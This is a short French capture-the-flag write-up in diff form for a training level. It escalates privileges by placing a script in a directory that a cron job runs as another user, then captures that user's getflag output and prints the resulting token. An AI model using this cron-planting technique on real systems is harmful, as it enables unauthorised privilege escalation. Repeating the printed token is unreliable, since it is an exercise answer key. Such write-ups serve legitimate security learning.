@@ -1,0 +1,20 @@
+etape 1 : On recois un message You have new mail.
+
+etape 2 : comme dans lexo un nous avons fais un find . -name "mail" dans ~ -> on recois 
+./usr/lib/byobu/mail
+./var/mail
+./var/spool/mail
+./rofs/usr/lib/byobu/mail
+./rofs/var/mail
+./rofs/var/spool/mail
+
+on a donc cat ./usr/lib/byobu/mail
+
+et sur l'une des lignes on a MAILFILE="/var/spool/mail/$USER"
+ 
+dans le fichier level05 il yavait une tache cron qui s'execute toute les 2 minutes et qui execute un fichier avec les droits flag05 nous avons donc creer un fichier dans /opt/openarenaserver
+
+le fichier contient echo 'getflag > /tmp/test.txt' > test.sh
+
+grace a cette commande on redirige le flux dans test.txt et on recois : Check flag.Here is your token : viuaaale9huek52boumoomioc
+
